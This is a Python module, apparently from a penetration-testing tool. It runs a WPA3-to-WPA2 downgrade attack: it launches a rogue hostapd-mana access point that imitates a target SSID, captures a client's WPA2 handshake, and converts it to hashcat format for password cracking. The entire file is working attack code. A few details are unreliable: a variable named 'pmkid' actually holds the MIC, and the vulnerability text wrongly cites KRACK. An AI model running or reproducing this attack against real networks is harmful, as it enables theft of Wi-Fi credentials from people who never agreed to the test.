# attack_module.py
import os
import subprocess
import struct
import glob
import sys
from modules.scan_module import (
    check_interface_exists,
    check_managed_mode,
    set_managed_mode
)
from ptlibs import ptjsonlib, ptprinthelper
from ptlibs.ptprinthelper import ptprint


def create_config_file(folder, ap, managed_iface):
    #Create hostapd-mana configuration file for the rogue access point
    conf = f"""interface={managed_iface}
driver=nl80211
hw_mode=g
channel={ap['Channel']}
ssid={ap['SSID']}
mana_wpaout={folder}/{ap['SSID']}-handshake.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
"""
    path = os.path.join(folder, f"{ap['SSID']}-sae.conf")
    with open(path, 'w') as f:
        f.write(conf)
    return path


def convert_handshake(handshake_file):
    #Convert captured handshake from hccapx format to hashcat 22000 format
    with open(handshake_file, "rb") as f:
        data = f.read()

    def get_data(fmt, segment):
        #Extract structured data using struct.unpack
        res = struct.unpack(fmt, segment)
        return res[0] if len(res) == 1 else res

    # Validate file format
    signature = get_data('4s', data[0:4])
    if signature != b'HCPX':
        ptjsonlib_object.end_error(f"Invalid hccapx file signature: {signature}", args_global.json)

    # Extract data fields from binary format
    message_pair = get_data('B', data[8:9])
    essid_len = get_data('B', data[9:10])
    essid = get_data(f'{essid_len}s', data[10:10 + essid_len])

    keymic = get_data('16s', data[43:59])
    mac_ap = get_data('6s', data[59:65])
    nonce_ap = get_data('32s', data[65:97])
    mac_sta = get_data('6s', data[97:103])
    eapol_len = get_data('H', data[135:137])
    eapol = get_data(f'{eapol_len}s', data[137:137 + eapol_len])

    # Format data for hashcat 22000 format
    protocol = "WPA"
    pmkid = keymic.hex()
    type_str = "02"
    converted = (
        f"{protocol}*{type_str}*{pmkid}*"
        f"{mac_ap.hex()}*{mac_sta.hex()}*{essid.hex()}*"
        f"{nonce_ap.hex()}*{eapol.hex()}*{message_pair:02x}"
    )

    # Save converted format
    out_file = handshake_file.replace('.hccapx', '.22000')
    with open(out_file, 'w') as f:
        f.write(converted + '\n')
    return out_file


def start_attack(config_file, args, folder):
    #Start hostapd-mana to create rogue AP and capture handshakes
    ptprint(f"Launching hostapd-mana with config: {config_file}", bullet_type="INFO", condition=not args_global.json)

    proc = subprocess.Popen(
        ['hostapd-mana', config_file],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    try:
        while True:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if "Captured a WPA/2 handshake from" in line:
                ptprint(f"Handshake captured! Shutting down rogue AP.", bullet_type="OK", condition=not args_global.json)

                proc.terminate()
                # Convert handshake to hashcat format
                pcapx = config_file.replace('-sae.conf', '-handshake.hccapx')
                converted = convert_handshake(pcapx)

                ptprint(f"Converted handshake saved at: {converted}", bullet_type="INFO", condition=not args_global.json)
                break
    except KeyboardInterrupt:
        # User pressed Ctrl-C: cleanly terminate hostapd-mana and exit
        proc.terminate()
        # JSON mode: emit an error; otherwise just print and exit
        if args_global.json:
            ptjsonlib_object.end_error("Attack aborted by user", args_global.json)
        else:
            ptprint("Attack aborted by user", bullet_type="ERROR", condition=not args_global.json)
        sys.exit(1)
    err = proc.stderr.read().strip()
    if err:
        ptprint(f"hostapd-mana errors:\n{err}", bullet_type="ERROR", condition=not args_global.json)


def attack(args):
    #Main attack function that sets up and executes the downgrade attack
    global args_global
    global ptjsonlib_object

    ptjsonlib_object = ptjsonlib.PtJsonLib()
    args_global = args

    # Import and set globals for scan_module
    import modules.scan_module as scan_mod
    scan_mod.ptjsonlib_object = ptjsonlib_object
    scan_mod.args_global = args_global

    # Pre-check interfaces
    check_interface_exists(args.iface)
    check_interface_exists(args.rogue_iface)
    if not check_managed_mode(args.rogue_iface):
        args.rogue_iface = set_managed_mode(args.rogue_iface)

    # Determine output folder
    if args.output_folder:
        folder = args.output_folder
    else:
        # Auto-detect most recent scan-* directory
        scans = [d for d in glob.glob('scan-*') if os.path.isdir(d)]
        if not scans:
            ptjsonlib_object.end_error("No scan-* folders found; please specify --output-folder.", args_global.json)
        folder = sorted(scans)[-1]

    # Build AP dict with target information
    ap = {
        'SSID': args.ssid,
        'BSSID': args.client_mac,
        'Channel': args.channel
    }

    # Create configuration and run attack
    config_file = create_config_file(folder, ap, args.rogue_iface)
    start_attack(config_file, args, folder)

    # Fill out the json object if vulnerability found
    if args_global.json:
        handshake_file = config_file.replace("-sae.conf", "-handshake.22000")
        ptjsonlib_object.add_vulnerability(
            "PTV-WPA-WPA2ENCRYPTION",
            vuln_request=f"WPA2 encryption used",
            vuln_response=(
                f"WPA2 handshake captured from {args_global.client_mac} client, "
                f"credentials can be abused via KRACK vulnerability. "
                f"Handshake file located at {handshake_file}"
            )
        )

    ptjsonlib_object.set_status("finished")
    ptprint(ptjsonlib_object.get_result_json(), "", args_global.json)
